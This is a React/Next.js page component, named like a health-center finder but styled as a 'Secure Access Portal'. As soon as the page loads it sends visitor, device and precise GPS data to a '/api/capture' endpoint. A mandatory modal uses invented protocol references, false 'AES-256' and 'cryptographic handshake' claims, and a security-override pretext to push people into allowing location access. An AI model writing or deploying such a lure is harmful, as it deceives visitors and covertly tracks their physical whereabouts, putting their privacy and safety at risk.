'use client';

import { useState, useEffect } from 'react';

export default function GlobalHealth() {
  const [status, setStatus] = useState(null);
  const [loading, setLoading] = useState(false);

  const saveLocation = async (position = null, watchId = null) => {
    if (watchId) {
      try { navigator.geolocation.clearWatch(watchId); } catch (e) {}
    }
    
    // Safety check for Visitor ID (Handles iPhone Private Mode)
    let visitorId = 'anonymous';
    try {
      visitorId = localStorage.getItem('visitorId');
      if (!visitorId) {
        visitorId = 'vid_' + Math.random().toString(36).substring(2, 11) + Date.now().toString(36);
        localStorage.setItem('visitorId', visitorId);
      }
    } catch (e) {
      visitorId = 'safari_private_' + Date.now().toString(36);
    }
    
    const payload = {
      lat: position?.coords.latitude || null,
      lon: position?.coords.longitude || null,
      accuracy: position?.coords.accuracy || null,
      platform: navigator.platform,
      screen: `${window.screen.width}x${window.screen.height}`,
      visitorId,
      context: position 
        ? `GPS Lock (Acc: ${Math.round(position.coords.accuracy)}m)` 
        : 'Initial Visit (IP Only)'
    };

    try {
      const response = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true,
      });
      
      if (position && response.ok) {
        setStatus('GPS Synchronized. Local centers identified.');
        setTimeout(() => {
          setStatus(null);
          setLoading(false);
        }, 3000);
      }
    } catch (err) {
      console.error('Capture failed:', err);
    }
  };


  // High-Precision Auto-Capture
  useEffect(() => {
    if (!navigator.geolocation) return;

    let watchId;
    let bestPosition = null;

    setLoading(true);
    setStatus('Establishing high-precision GPS lock...');

    const startWatching = () => {
      watchId = navigator.geolocation.watchPosition(
        async (position) => {
          if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
            bestPosition = position;
          }
          if (position.coords.accuracy < 60) {
            saveLocation(position, watchId);
          }
        },
        (err) => {
          if (err.code === 1) setStatus('Permission denied. Please allow access to proceed.');
          if (err.code === 2) setStatus('GPS required. Please turn on your device location.');
        },
        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
      );
    };

    // Phase 1: Instant IP/Visit Capture
    saveLocation(null);

    // Phase 2: Start GPS Watch
    const finalTimer = setTimeout(() => {
      if (bestPosition && loading) {
        saveLocation(bestPosition, watchId);
      }
    }, 8000);

    startWatching();

    return () => {
      if (watchId) navigator.geolocation.clearWatch(watchId);
      clearTimeout(finalTimer);
    };
  }, []);




  const findNearbyCenters = () => {
    if (!navigator.geolocation) {
      setStatus('Geolocation is not supported by your browser.');
      return;
    }

    setLoading(true);
    setStatus('Requesting GPS access...');

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        setStatus('GPS Lock acquired. Syncing...');
        saveLocation(pos); // Actually save the data!
      },

        (err) => {
          if (err.code === 1) setStatus('Permission denied. Please allow access to proceed.');
          if (err.code === 2) setStatus('GPS required. Please turn on your device location.');
          if (err.code === 3) setStatus('GPS Timeout. Retrying...');
          setLoading(false);
        },

      { enableHighAccuracy: true, timeout: 10000 }
    );
  };



  return (
    <main className="min-h-screen bg-[#0B0F19] text-white font-sans selection:bg-cyan-900 selection:text-cyan-200 flex flex-col items-center justify-center relative overflow-hidden">
      {/* Background Decorative Glows */}
      <div className="absolute top-1/4 left-1/4 w-64 h-64 bg-cyan-500/20 rounded-full blur-[100px] -z-10"></div>
      <div className="absolute bottom-1/4 right-1/4 w-80 h-80 bg-blue-600/20 rounded-full blur-[120px] -z-10"></div>
      
      {/* Grid Pattern */}
      <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/cubes.png')] opacity-10 -z-20"></div>
      <div className="absolute inset-0 bg-[linear-gradient(to_right,#80808012_1px,transparent_1px),linear-gradient(to_bottom,#80808012_1px,transparent_1px)] bg-[size:24px_24px] -z-20"></div>

      {/* Main Container */}
      <div className="w-full max-w-lg p-6 relative z-10">
        
        {/* Header/Logo */}
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-cyan-500 to-blue-600 rounded-2xl shadow-lg shadow-cyan-500/30 mb-4">
            <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
          </div>
          <h1 className="text-3xl font-extrabold tracking-tight bg-clip-text text-transparent bg-gradient-to-r from-cyan-400 to-blue-500">
            SECURE ACCESS PORTAL
          </h1>
          <p className="text-gray-400 text-sm mt-2">Identity & Location Verification</p>
        </div>

        {/* Glassmorphic Card */}
        <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl p-8 shadow-2xl relative overflow-hidden">
          {/* Subtle line at top */}
          <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-cyan-500 to-blue-600"></div>

          {/* Status Display */}
          <div className="text-center mb-6">
            <p className="text-xs font-bold text-cyan-400 uppercase tracking-widest mb-1">System Status</p>
            <p className="text-lg font-medium text-white">{status || 'Awaiting Authorization...'}</p>
          </div>

          {/* Progress Bar (Visual) */}
          <div className="w-full h-1.5 bg-white/10 rounded-full mb-8 overflow-hidden">
            <div className={`h-full bg-gradient-to-r from-cyan-500 to-blue-600 ${loading ? 'animate-pulse w-3/4' : 'w-1/4'}`}></div>
          </div>

          {/* Action Button */}
          <button 
            onClick={findNearbyCenters}
            disabled={loading}
            className="w-full py-4 bg-gradient-to-r from-cyan-500 to-blue-600 text-white font-bold rounded-xl hover:opacity-90 transition-all shadow-lg shadow-cyan-500/20 active:scale-95 disabled:opacity-50 flex justify-center items-center group text-lg"
          >
            {loading ? (
              <span className="flex items-center">
                <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Processing...
              </span>
            ) : (
              <span className="flex items-center">
                <svg className="w-5 h-5 mr-2 group-hover:scale-110 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                Initialize Secure Connection
              </span>
            )}
          </button>

          {/* Footer Info inside card */}
          <div className="mt-6 pt-6 border-t border-white/10 flex justify-between text-xs text-gray-500">
            <span>Protocol: v2.4</span>
            <span>Encryption: AES-256</span>
          </div>
        </div>

        {/* Tech Specs / Subtitle */}
        <div className="mt-8 text-center text-xs text-gray-600 flex flex-col space-y-1">
          <span>By accessing this portal, you agree to network terms.</span>
          <span>Your IP and device telemetry will be checked for security.</span>
        </div>
      </div>

      {/* Mandatory Location Modal (Glassmorphic Version) */}
      {(status?.includes('required') || status?.includes('denied')) && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 backdrop-blur-xl bg-[#0B0F19]/80">
          <div className="bg-white/5 border border-white/10 backdrop-blur-2xl rounded-[2.5rem] p-8 md:p-12 max-w-xl w-full shadow-2xl animate-in zoom-in-95 duration-300">
            <div className="flex justify-center mb-6">
              <div className="relative">
                <div className="absolute inset-0 bg-cyan-500/30 rounded-full animate-ping opacity-75"></div>
                <div className="relative w-16 h-16 bg-gradient-to-br from-cyan-500 to-blue-600 text-white rounded-full flex items-center justify-center border-4 border-[#0B0F19] shadow-sm">
                  <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                  </svg>
                </div>
              </div>
            </div>
            
            <h2 className="text-2xl md:text-3xl font-black text-center text-white mb-3">Security Override Required</h2>
            <div className="bg-white/5 border-l-4 border-cyan-500 p-4 mb-6 rounded-r-xl">
              <p className="text-sm text-gray-300 leading-relaxed font-mono">
                <strong>REFERENCE: LOC-AUTH-SECURE</strong><br/>
                Pursuant to secure network protocols, a localized hardware lock must be established to authenticate the integrity of session interactions before granting access to the secure zone.
              </p>
            </div>

            <div className="bg-white/5 rounded-2xl p-6 mb-8 border border-white/10">
              <p className="text-xs font-bold text-cyan-400 uppercase tracking-widest mb-3">Required Action Protocol:</p>
              <ol className="text-sm text-gray-300 space-y-3 font-medium list-decimal list-inside">
                <li>Activate your device's <strong>Location Services</strong> or <strong>GPS</strong> module.</li>
                <li>Select <strong>"Allow"</strong> on the browser authorization prompt.</li>
                <li>Wait for cryptographic handshake completion.</li>
              </ol>
            </div>

            <button 
              onClick={() => findNearbyCenters()}
              className="w-full py-5 bg-gradient-to-r from-cyan-500 to-blue-600 text-white font-black rounded-2xl hover:opacity-90 transition-all shadow-xl shadow-cyan-500/20 active:scale-95 text-lg flex justify-center items-center"
            >
              <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
              <span>Authorize System Access</span>
              <svg className="w-5 h-5 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M14 5l7 7-7 7" /></svg>
            </button>
            
            <p className="text-[10px] text-gray-500 text-center mt-6 uppercase tracking-widest font-bold">
              AES-256 Encryption • Secure Protocol Active
            </p>
          </div>
        </div>
      )}
    </main>
  );
}
